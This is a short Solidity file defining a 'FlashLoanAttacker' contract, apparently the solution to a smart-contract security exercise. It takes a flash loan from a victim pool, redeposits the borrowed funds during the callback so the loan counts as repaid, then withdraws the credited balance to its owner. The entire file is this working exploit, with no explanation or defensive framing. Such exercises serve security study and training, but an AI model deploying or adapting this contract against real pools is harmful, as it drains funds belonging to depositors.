//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./FlashLoan.sol";
import "./IFlashLoanReceiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract FlashLoanAttacker is IFlashLoanReceiver{
    FlashLoan victim;
    address payable owner;

    using Address for address payable;

    constructor(FlashLoan _victim) {
        victim = _victim;
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        victim.loan(amount);
    }

    function execute() external payable {
        victim.deposit{value: msg.value}();
    }

    function withdraw() external{
        victim.withdraw();
        payable(owner).sendValue(address(this).balance);
    }

    receive() external payable {

    }
}
